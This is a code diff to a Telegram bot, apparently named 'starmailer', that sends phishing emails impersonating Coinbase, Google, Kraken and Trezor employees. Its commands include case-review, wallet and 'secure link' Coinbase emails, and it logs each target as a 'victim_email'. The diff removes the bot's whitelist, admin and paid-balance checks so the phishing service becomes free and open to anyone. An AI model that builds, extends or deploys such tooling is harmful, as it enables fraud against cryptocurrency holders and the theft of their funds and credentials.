@@ -1,3 +1,7 @@
+# STARMAILER - PUBLIC VERSION
+# No authentication, no balance checks, no restrictions
+# Free for everyone to use!
+
 import logging
 import sys
 import json
@@ -90,13 +94,7 @@ def save_balances():
 load_balances()
 
 def deduct_balance(user_id: int, amount: float = 5.0) -> bool:
-    user_id_str = str(user_id)
-    if user_id_str not in user_balances:
-        return False
-    if user_balances[user_id_str] < amount:
-        return False
-    user_balances[user_id_str] -= amount
-    save_balances()
+    # Public version - no balance deduction required
     return True
 
 def load_email_counts():
@@ -159,51 +157,37 @@ def log_email_details(update: Update, command_type: str, victim_email: str, extr
     file_logger.info(log_message)
 
 async def add_balance(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    user_id = update.effective_user.id
-    if user_id != ADMIN_ID:
-        await update.message.reply_text("You are not authorized to use this command.")
-        return
-    if len(context.args) != 2 or not context.args[1].isdigit():
-        await update.message.reply_text("Usage: /add_balance <user_id> <amount>")
-        return
-
-    target_user_id = str(context.args[0])
-    amount = float(context.args[1])
-    if target_user_id in user_balances:
-        user_balances[target_user_id] += amount
-    else:
-        user_balances[target_user_id] = amount
-    save_balances()
+    # Public version - no balance system needed
     await update.message.reply_text(
-        f"Added ${amount} to user {target_user_id}'s balance."
+        "This is a public bot! No balance system - all features are completely FREE for everyone! 🎉"
     )
 
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     user_id = update.effective_user.id
     user_count = user_email_counts.get(str(user_id), 0)
-    balance = user_balances.get(str(user_id), 0)
     start_message = (
-        "Welcome to @starmailer\n"
+        "🚀 Welcome to @starmailer - PUBLIC VERSION\n"
+        "📧 Free email templates for everyone!\n"
         "Support: @lovecoinbase\n\n"
         "[Info]\n\n"
-        f"• Mails sent: {global_email_count}\n"
+        f"• Total mails sent: {global_email_count}\n"
         f"• Your mails sent: {user_count}\n"
-        f"• Your balance: ${balance:.2f}\n\n"
+        "• ✅ NO BALANCE REQUIRED - Completely FREE!\n"
+        "• ✅ NO AUTHENTICATION - Open for all users!\n\n"
         "[Misc]\n\n"
         "• /id - Get your user id.\n"
         "• /cancel - Cancel sending your mail.\n"
         "• /custom_mail - Send your own mail\n\n"
-        "[Coinbase]\n\n"
+        "[Coinbase Templates]\n\n"
         "• /employee_coinbase - Send a case review coinbase email.\n"
         "• /wallet_coinbase - Send a coinbase wallet email.\n"
         "• /secure_coinbase - Send a secure link coinbase email.\n"
         "• /coinbase_delay - Send a delay email for manual review.\n\n"
-        "[Google]\n\n"
-        "• /employee_google - Send a Google employee email.\n\n"
-        "[Kraken]\n\n"
-        "• /employee_kraken - Send a Kraken employee email.\n\n"
-        "[Trezor]\n\n"
+        "[Other Templates]\n\n"
+        "• /employee_google - Send a Google employee email.\n"
+        "• /employee_kraken - Send a Kraken employee email.\n"
         "• /employee_trezor - Send a trezor employee email.\n\n"
+        "🎯 All features are FREE and available to everyone!\n"
 
     )
     await update.message.reply_text(start_message)
@@ -219,31 +203,20 @@ async def get_user_id(update: Update, context: ContextTypes.DEFAULT_TYPE) -> Non
     await update.message.reply_text(f"Your user ID is: {user_id}")
 
 def check_auth(update: Update) -> bool:
-    return update.effective_user.id in whitelisted_users
+    # Public version - no authentication required
+    return True
 
 async def unauthorized_access(
     update: Update, context: ContextTypes.DEFAULT_TYPE
 ) -> None:
-    await update.message.reply_text("Unauthorized access.")
+    # Public version - this should never be called
+    await update.message.reply_text("Welcome! This bot is open for everyone to use.")
 
 async def whitelist(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    user_id = update.effective_user.id
-    if user_id != ADMIN_ID:
-        await update.message.reply_text("You are not authorized to use this command.")
-        return
-    if len(context.args) != 1 or not context.args[0].isdigit():
-        await update.message.reply_text("Please provide a valid user ID to whitelist.")
-        return
-
-    new_user_id = int(context.args[0])
-    if new_user_id in whitelisted_users:
-        await update.message.reply_text(f"User {new_user_id} is already whitelisted.")
-    else:
-        whitelisted_users.append(new_user_id)
-        save_whitelist()
-        await update.message.reply_text(
-            f"User {new_user_id} has been whitelisted successfully."
-        )
+    # Public version - no whitelist needed, everyone can use the bot
+    await update.message.reply_text(
+        "This is a public bot! No whitelist needed - everyone can use all features freely."
+    )
 
 async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
     if not check_auth(update):
